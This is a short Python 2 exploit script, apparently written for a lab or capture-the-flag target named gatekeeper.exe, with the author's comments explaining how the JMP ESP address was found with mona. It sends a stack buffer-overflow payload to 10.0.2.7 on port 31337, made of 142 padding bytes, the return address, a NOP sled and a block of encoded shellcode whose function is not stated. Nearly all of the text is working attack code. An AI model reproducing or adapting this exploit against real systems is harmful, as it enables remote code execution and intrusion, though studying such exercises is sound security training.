#06-20-2020 DC:  This is a client, not a server.  
#06-20-2020 DC:  This f.py script will send an actual jmp aned a payload.

#The jmp was found with !mona jump -r esp -m gatekeeper.exe and it was 080414c3, so I'll convert to
#little-endian as follows:  jmp = "\xc3\x14\x04\x08"



#!/usr/bin/python
 
import socket

target_host = "10.0.2.7"
target_port = 31337
jmp = "\xc3\x14\x04\x08"

shellcode = (
"\xd9\xc2\xd9\x74\x24\xf4\xb8\xab\xba\xb4\x86\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x13\x03\xe8\xa9\x56\x73\x12\x25\x14"
"\x7c\xea\xb6\x79\xf4\x0f\x87\xb9\x62\x44\xb8\x09\xe0\x08\x35"
"\xe1\xa4\xb8\xce\x87\x60\xcf\x67\x2d\x57\xfe\x78\x1e\xab\x61"
"\xfb\x5d\xf8\x41\xc2\xad\x0d\x80\x03\xd3\xfc\xd0\xdc\x9f\x53"
"\xc4\x69\xd5\x6f\x6f\x21\xfb\xf7\x8c\xf2\xfa\xd6\x03\x88\xa4"
"\xf8\xa2\x5d\xdd\xb0\xbc\x82\xd8\x0b\x37\x70\x96\x8d\x91\x48"
"\x57\x21\xdc\x64\xaa\x3b\x19\x42\x55\x4e\x53\xb0\xe8\x49\xa0"
"\xca\x36\xdf\x32\x6c\xbc\x47\x9e\x8c\x11\x11\x55\x82\xde\x55"
"\x31\x87\xe1\xba\x4a\xb3\x6a\x3d\x9c\x35\x28\x1a\x38\x1d\xea"
"\x03\x19\xfb\x5d\x3b\x79\xa4\x02\x99\xf2\x49\x56\x90\x59\x06"
"\x9b\x99\x61\xd6\xb3\xaa\x12\xe4\x1c\x01\xbc\x44\xd4\x8f\x3b"
"\xaa\xcf\x68\xd3\x55\xf0\x88\xfa\x91\xa4\xd8\x94\x30\xc5\xb2"
"\x64\xbc\x10\x14\x34\x12\xcb\xd5\xe4\xd2\xbb\xbd\xee\xdc\xe4"
"\xde\x11\x37\x8d\x75\xe8\xd0\xb8\x89\xf0\x25\xd5\x8b\xf4\x34"
"\x79\x05\x12\x5c\x91\x43\x8d\xc9\x08\xce\x45\x6b\xd4\xc4\x20"
"\xab\x5e\xeb\xd5\x62\x97\x86\xc5\x13\x57\xdd\xb7\xb2\x68\xcb"
"\xdf\x59\xfa\x90\x1f\x17\xe7\x0e\x48\x70\xd9\x46\x1c\x6c\x40"
"\xf1\x02\x6d\x14\x3a\x86\xaa\xe5\xc5\x07\x3e\x51\xe2\x17\x86"
"\x5a\xae\x43\x56\x0d\x78\x3d\x10\xe7\xca\x97\xca\x54\x85\x7f"
"\x8a\x96\x16\xf9\x93\xf2\xe0\xe5\x22\xab\xb4\x1a\x8a\x3b\x31"
"\x63\xf6\xdb\xbe\xbe\xb2\xfc\x5c\x6a\xcf\x94\xf8\xff\x72\xf9"
"\xfa\x2a\xb0\x04\x79\xde\x49\xf3\x61\xab\x4c\xbf\x25\x40\x3d"
"\xd0\xc3\x66\x92\xd1\xc1")

nops = "\x90" * 15



payload = "A" * 142 + jmp + nops + shellcode

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

client.send("GET / HTTP/1.0\r\nHOST: 10.0.2.7\r\n\r\n")
client.send("220 " + payload + "\r\n")

response = client.recv(4096)
